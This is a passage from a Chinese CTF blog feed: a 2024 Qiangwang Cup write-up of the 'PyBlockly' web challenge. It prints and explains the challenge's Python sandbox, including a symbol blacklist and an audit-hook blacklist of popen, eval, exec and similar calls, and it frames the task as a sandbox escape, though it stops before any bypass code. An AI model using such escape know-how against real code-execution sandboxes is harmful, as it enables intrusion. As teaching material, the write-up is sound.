    
    
    <category term="Pwn手的自我修养" scheme="http://blog.g01den.top/categories/Pwn/"/>
    
    
    <category term="Pwn" scheme="http://blog.g01den.top/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>【2024】强网杯</title>
    <link href="http://blog.g01den.top/posts/666fe8df.html"/>
    <id>http://blog.g01den.top/posts/666fe8df.html</id>
    <published>2024-11-03T11:28:49.000Z</published>
    <updated>2024-11-03T11:32:14.159Z</updated>
    
    <content type="html"><![CDATA[<h1 id="web"><a class="markdownIt-Anchor" href="#web">#</a> web：</h1><h2 id="pyblockly"><a class="markdownIt-Anchor" href="#pyblockly">#</a> PyBlockly：</h2><p>​网站是一个通过 block 的堆积木的形式编程，有两种数据类型以及四种函数，分别是正常运算，print 输出，min 和 max 功能，随便写一些代码，发现结果会回显出来。</p><p>​再来看看源码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> unidecode</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> ast</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> importlib.util</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;JSON_AS_ASCII&#x27;</span>] = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">blacklist_pattern = <span class="string">r&quot;[!\&quot;#$%&amp;&#x27;()*+,-./:;&lt;=&gt;?@[\\\]^_`&#123;|&#125;~]&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">module_exists</span>(<span class="params">module_name</span>):</span><br><span class="line">    spec = importlib.util.find_spec(module_name)</span><br><span class="line">    <span class="keyword">if</span> spec <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> module_name <span class="keyword">in</span> sys.builtin_module_names:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> spec.origin:</span><br><span class="line">        std_lib_path = os.path.dirname(os.__file__)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> spec.origin.startswith(std_lib_path) <span class="keyword">and</span> <span class="keyword">not</span> spec.origin.startswith(os.getcwd()):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">verify_secure</span>(<span class="params">m</span>):</span><br><span class="line">    <span class="keyword">for</span> node <span class="keyword">in</span> ast.walk(m):</span><br><span class="line">        <span class="keyword">match</span> <span class="built_in">type</span>(node):</span><br><span class="line">            <span class="keyword">case</span> ast.Import:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;ERROR: Banned module &quot;</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            <span class="keyword">case</span> ast.ImportFrom:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;ERROR: Banned module <span class="subst">&#123;node.module&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_for_blacklisted_symbols</span>(<span class="params">input_text</span>):</span><br><span class="line">    <span class="keyword">if</span> re.search(blacklist_pattern, input_text):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">block_to_python</span>(<span class="params">block</span>):</span><br><span class="line">    block_type = block[<span class="string">&#x27;type&#x27;</span>]</span><br><span class="line">    code = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> block_type == <span class="string">&#x27;print&#x27;</span>:</span><br><span class="line">        text_block = block[<span class="string">&#x27;inputs&#x27;</span>][<span class="string">&#x27;TEXT&#x27;</span>][<span class="string">&#x27;block&#x27;</span>]</span><br><span class="line">        text = block_to_python(text_block)</span><br><span class="line">        code = <span class="string">f&quot;print(<span class="subst">&#123;text&#125;</span>)&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> block_type == <span class="string">&#x27;math_number&#x27;</span>:</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">str</span>(block[<span class="string">&#x27;fields&#x27;</span>][<span class="string">&#x27;NUM&#x27;</span>]).isdigit():</span><br><span class="line">            code = <span class="built_in">int</span>(block[<span class="string">&#x27;fields&#x27;</span>][<span class="string">&#x27;NUM&#x27;</span>])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            code = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> block_type == <span class="string">&#x27;text&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> check_for_blacklisted_symbols(block[<span class="string">&#x27;fields&#x27;</span>][<span class="string">&#x27;TEXT&#x27;</span>]):</span><br><span class="line">            code = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">            code = <span class="string">&quot;&#x27;&quot;</span> + unidecode.unidecode(block[<span class="string">&#x27;fields&#x27;</span>][<span class="string">&#x27;TEXT&#x27;</span>]) + <span class="string">&quot;&#x27;&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> block_type == <span class="string">&#x27;max&#x27;</span>:</span><br><span class="line"></span><br><span class="line">        a_block = block[<span class="string">&#x27;inputs&#x27;</span>][<span class="string">&#x27;A&#x27;</span>][<span class="string">&#x27;block&#x27;</span>]</span><br><span class="line">        b_block = block[<span class="string">&#x27;inputs&#x27;</span>][<span class="string">&#x27;B&#x27;</span>][<span class="string">&#x27;block&#x27;</span>]</span><br><span class="line">        a = block_to_python(a_block)</span><br><span class="line">        b = block_to_python(b_block)</span><br><span class="line">        code = <span class="string">f&quot;max(<span class="subst">&#123;a&#125;</span>, <span class="subst">&#123;b&#125;</span>)&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> block_type == <span class="string">&#x27;min&#x27;</span>:</span><br><span class="line">        a_block = block[<span class="string">&#x27;inputs&#x27;</span>][<span class="string">&#x27;A&#x27;</span>][<span class="string">&#x27;block&#x27;</span>]</span><br><span class="line">        b_block = block[<span class="string">&#x27;inputs&#x27;</span>][<span class="string">&#x27;B&#x27;</span>][<span class="string">&#x27;block&#x27;</span>]</span><br><span class="line">        a = block_to_python(a_block)</span><br><span class="line">        b = block_to_python(b_block)</span><br><span class="line">        code = <span class="string">f&quot;min(<span class="subst">&#123;a&#125;</span>, <span class="subst">&#123;b&#125;</span>)&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;next&#x27;</span> <span class="keyword">in</span> block:</span><br><span class="line"></span><br><span class="line">        block = block[<span class="string">&#x27;next&#x27;</span>][<span class="string">&#x27;block&#x27;</span>]</span><br><span class="line"></span><br><span class="line">        code += <span class="string">&quot;\n&quot;</span> + block_to_python(block) + <span class="string">&quot;\n&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> code</span><br><span class="line">    <span class="keyword">return</span> code</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">json_to_python</span>(<span class="params">blockly_data</span>):</span><br><span class="line">    block = blockly_data[<span class="string">&#x27;blocks&#x27;</span>][<span class="string">&#x27;blocks&#x27;</span>][<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    python_code = <span class="string">&quot;&quot;</span></span><br><span class="line">    python_code += block_to_python(block) + <span class="string">&quot;\n&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> python_code</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">do</span>(<span class="params">source_code</span>):</span><br><span class="line">    hook_code = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">def my_audit_hook(event_name, arg):</span></span><br><span class="line"><span class="string">    blacklist = [&quot;popen&quot;, &quot;input&quot;, &quot;eval&quot;, &quot;exec&quot;, &quot;compile&quot;, &quot;memoryview&quot;]</span></span><br><span class="line"><span class="string">    if len(event_name) &gt; 4:</span></span><br><span class="line"><span class="string">        raise RuntimeError(&quot;Too Long!&quot;)</span></span><br><span class="line"><span class="string">    for bad in blacklist:</span></span><br><span class="line"><span class="string">        if bad in event_name:</span></span><br><span class="line"><span class="string">            raise RuntimeError(&quot;No!&quot;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">__import__(&#x27;sys&#x27;).addaudithook(my_audit_hook)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(source_code)</span><br><span class="line">    code = hook_code + source_code</span><br><span class="line">    tree = <span class="built_in">compile</span>(source_code, <span class="string">&quot;run.py&quot;</span>, <span class="string">&#x27;exec&#x27;</span>, flags=ast.PyCF_ONLY_AST)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> verify_secure(tree):</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;run.py&quot;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(code)</span><br><span class="line">            result = subprocess.run([<span class="string">&#x27;python&#x27;</span>, <span class="string">&#x27;run.py&#x27;</span>], stdout=subprocess.PIPE, timeout=<span class="number">5</span>).stdout.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">            os.remove(<span class="string">&#x27;run.py&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Execution aborted due to security concerns.&quot;</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        os.remove(<span class="string">&#x27;run.py&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Timeout!&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> app.send_static_file(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/blockly_json&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">blockly_json</span>():</span><br><span class="line">    blockly_data = request.get_data()</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">type</span>(blockly_data))</span><br><span class="line">    blockly_data = json.loads(blockly_data.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    <span class="built_in">print</span>(blockly_data)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        python_code = json_to_python(blockly_data)</span><br><span class="line">        <span class="keyword">return</span> do(python_code)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;Error generating Python code&quot;</span>, <span class="string">&quot;details&quot;</span>: <span class="built_in">str</span>(e)&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure><p>​一点小疑问，这个代码有啥用，为啥没执行：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">module_exists</span>(<span class="params">module_name</span>):</span><br><span class="line">    spec = importlib.util.find_spec(module_name)</span><br><span class="line">    <span class="keyword">if</span> spec <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> module_name <span class="keyword">in</span> sys.builtin_module_names:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> spec.origin:</span><br><span class="line">        std_lib_path = os.path.dirname(os.__file__)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> spec.origin.startswith(std_lib_path) <span class="keyword">and</span> <span class="keyword">not</span> spec.origin.startswith(os.getcwd()):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure><blockquote><p>​这段代码定义了一个函数  <code>module_exists</code> ，用于检查一个指定的模块是否存在。这个函数通过几个步骤来判断模块是否存在，并且区分了内置模块、标准库模块和第三方或本地模块。下面是对这段代码的逐行解释：</p><ol><li><pre><code> def module_exists(module_name):</code></pre></li></ol>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  - 这行定义了一个名为 `module_exists` 的函数，它接受一个参数 `module_name`，即要检查的模块名。</span><br><span class="line"></span><br><span class="line">&gt;2. ```</span><br><span class="line">  spec = importlib.util.find_spec(module_name)</span><br></pre></td></tr></table></figure><ul><li>使用  <code>importlib.util.find_spec</code>  函数尝试找到名为  <code>module_name</code>  的模块的规格（spec）。这个函数返回一个模块规格对象，如果模块不存在，则返回  <code>None</code> 。</li></ul><ol start="3"><li><pre><code> if spec is None:</code></pre></li></ol>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  - 这行检查 `find_spec` 返回的 `spec` 是否为 `None`。如果是，说明没有找到模块，执行下一行代码。</span><br><span class="line"></span><br><span class="line">&gt;4. ```</span><br><span class="line">  return False</span><br></pre></td></tr></table></figure><ul><li>如果模块不存在（ <code>spec</code>  为  <code>None</code> ），函数返回  <code>False</code> 。</li></ul><ol start="5"><li><pre><code> if module_name in sys.builtin_module_names:</code></pre></li></ol>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  - 这行检查 `module_name` 是否在 `sys.builtin_module_names` 列表中。`sys.builtin_module_names` 包含了所有内置模块的名称。如果 `module_name` 是内置模块，执行下一行代码。</span><br><span class="line"></span><br><span class="line">&gt;6. ```</span><br><span class="line">  return True</span><br></pre></td></tr></table></figure><ul><li>如果  <code>module_name</code>  是内置模块，函数返回  <code>True</code> 。</li></ul><ol start="7"><li><pre><code> if spec.origin:</code></pre></li></ol>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  - 这行检查 `spec` 对象的 `origin` 属性是否存在。`origin` 属性通常包含了模块的来源路径。如果 `origin` 存在，执行下一行代码。</span><br><span class="line"></span><br><span class="line">&gt;8. ```</span><br><span class="line">  std_lib_path = os.path.dirname(os.__file__)</span><br></pre></td></tr></table></figure><ul><li>这行获取 Python 标准库的路径。 <code>os.__file__</code>  是  <code>os</code>  模块的路径， <code>os.path.dirname</code>  获取这个路径的目录部分，即标准库的根目录。</li></ul><ol start="9"><li><pre><code> if spec.origin.startswith(std_lib_path) and not spec.origin.startswith(os.getcwd()):</code></pre></li></ol>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  - 这行检查 `spec.origin` 是否以标准库路径 `std_lib_path` 开头，并且不以当前工作目录 `os.getcwd()` 开头。这是为了确保模块是标准库的一部分，而不是当前工作目录下的模块。如果这两个条件都满足，执行下一行代码。</span><br><span class="line"></span><br><span class="line">&gt;10. ```</span><br><span class="line">   return True</span><br></pre></td></tr></table></figure><ul><li>如果模块是标准库的一部分，函数返回  <code>True</code> 。</li></ul><ol start="11"><li><pre><code>  return False</code></pre></li></ol>   <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">   - 如果模块既不是内置模块，也不是标准库模块，函数返回 `False`。</span><br><span class="line"></span><br><span class="line">&gt;总结：这个函数通过检查模块的规格（spec），判断模块是否存在，并进一步区分模块是内置模块、标准库模块还是其他类型的模块。如果模块存在且是内置模块或标准库模块，函数返回 `True`；否则返回 `False`。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">​问题也就出现在这里，前后我没发现有调用过这个函数，先无所谓，看看审其他的。</span><br><span class="line"></span><br><span class="line">​`blockly_json`函数开始，先读取参数，之后转UTF-8之后拿给json_to_python去转为python代码：</span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line">   python_code = &quot;&quot;</span><br><span class="line">   python_code += block_to_python(block) + &quot;\n&quot;</span><br></pre></td></tr></table></figure></blockquote><p>​继续审 block_to_python，这里很明显可以看出，从 type 里取值，如果是 print，max，min，next 就递归继续后面的代码或者参数，直到没有相应参数为止，之后就返回 code 了，当遇到 text 的话，就将所有的字符串进行正则比较，遇到符号就清空 code 参数，否则 code 加上去然后返回。之后就是 do 了，获得源码，然后执行：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">do</span>(<span class="params">source_code</span>):</span><br><span class="line">    hook_code = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">def my_audit_hook(event_name, arg):</span></span><br><span class="line"><span class="string">    blacklist = [&quot;popen&quot;, &quot;input&quot;, &quot;eval&quot;, &quot;exec&quot;, &quot;compile&quot;, &quot;memoryview&quot;]</span></span><br><span class="line"><span class="string">    if len(event_name) &gt; 4:</span></span><br><span class="line"><span class="string">        raise RuntimeError(&quot;Too Long!&quot;)</span></span><br><span class="line"><span class="string">    for bad in blacklist:</span></span><br><span class="line"><span class="string">        if bad in event_name:</span></span><br><span class="line"><span class="string">            raise RuntimeError(&quot;No!&quot;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">__import__(&#x27;sys&#x27;).addaudithook(my_audit_hook)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(source_code)</span><br><span class="line">    code = hook_code + source_code</span><br><span class="line">    tree = <span class="built_in">compile</span>(source_code, <span class="string">&quot;run.py&quot;</span>, <span class="string">&#x27;exec&#x27;</span>, flags=ast.PyCF_ONLY_AST)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> verify_secure(tree):</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;run.py&quot;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(code)</span><br><span class="line">            result = subprocess.run([<span class="string">&#x27;python&#x27;</span>, <span class="string">&#x27;run.py&#x27;</span>], stdout=subprocess.PIPE, timeout=<span class="number">5</span>).stdout.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">            os.remove(<span class="string">&#x27;run.py&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Execution aborted due to security concerns.&quot;</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        os.remove(<span class="string">&#x27;run.py&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Timeout!&quot;</span></span><br></pre></td></tr></table></figure><p>​这个情况感觉很像是沙箱了，不允许执行某些特定的函数，</p><p>这段代码定义了一个名为  <code>my_audit_hook</code>  的函数，并将其设置为 Python 解释器的审计钩子（audit hook）。审计钩子是一种机制，允许开发者在 Python 执行特定事件时插入自定义的检查或行为。这个功能在 Python 3.8 中被引入，主要用于安全目的，比如监控和限制某些潜在危险的操作。</p><blockquote><p>让我们逐步解析这段代码：</p><ol><li><p>函数定义</p><p>：</p><ul><li><code>def my_audit_hook(event_name, arg):</code> ：定义了一个名为  <code>my_audit_hook</code>  的函数，它接受两个参数： <code>event_name</code>  和  <code>arg</code> 。 <code>event_name</code>  是一个字符串，表示触发审计的事件名称； <code>arg</code>  是与该事件相关的附加信息，其类型和结构取决于具体的事件。</li></ul></li><li><p>黑名单</p><p>：</p><ul><li><code>blacklist = [&quot;popen&quot;, &quot;input&quot;, &quot;eval&quot;, &quot;exec&quot;, &quot;compile&quot;, &quot;memoryview&quot;]</code> ：定义了一个名为  <code>blacklist</code>  的列表，包含了一系列不希望被执行的函数或操作的名称。这些操作通常因为安全性原因而被认为是高风险的。</li></ul></li><li><p>事件名称长度检查</p><p>：</p><ul><li><code>if len(event_name) &gt; 4: raise RuntimeError(&quot;Too Long!&quot;)</code> ：这行代码检查  <code>event_name</code>  的长度是否超过 4 个字符。如果是，则抛出  <code>RuntimeError</code>  异常，异常信息为 “Too Long!”。这个检查看起来是随意设置的，因为事件名称的长度通常与安全性无直接关联。</li></ul></li><li><p>黑名单检查</p><p>：</p><ul><li>循环遍历  <code>blacklist</code>  列表，检查  <code>event_name</code>  中是否包含列表中的任何字符串。如果包含，则抛出  <code>RuntimeError</code>  异常，异常信息为 “No!”。这个检查旨在阻止执行黑名单中列出的高风险操作。</li></ul></li><li><p>设置审计钩子</p><p>：</p><ul><li><code>__import__('sys').addaudithook(my_audit_hook)</code> ：这行代码首先动态导入  <code>sys</code>  模块（尽管通常直接导入  <code>sys</code>  模块更为常见），然后调用  <code>sys.addaudithook</code>  方法，将  <code>my_audit_hook</code>  函数设置为审计钩子。这意味着每当 Python 解释器执行一个审计事件时， <code>my_audit_hook</code>  函数都会被调用。</li></ul></li></ol><p><strong>注意</strong>：</p><ul><li>审计钩子是一个强大的特性，应该谨慎使用。不当的审计钩子设置可能会阻止合法的操作，导致程序无法正常运行。</li><li>在实际生产环境中，对审计钩子的使用应该基于详细的安全分析和风险评估。</li></ul><p>- 此代码示例中的长度检查和黑名单可能需要根据实际的安全需求进行调整。</p></blockquote><p>​看上去像是一个沙箱，将代码写入文件，然后运行，捕获输出，需要逃逸：<span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvMTI2NDc/dGltZV9fMTMxMT1HcUd4dURSaVlpd3hscnpHN0R5R0RjR3Zmb1k1UW1vM3gjdG9jLTM0">https://xz.aliyun.com/t/12647?time__1311=GqGxuDRiYiwxlrzG7DyGDcGvfoY5Qmo3x#toc-34</span> 绕过 audit hook</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span 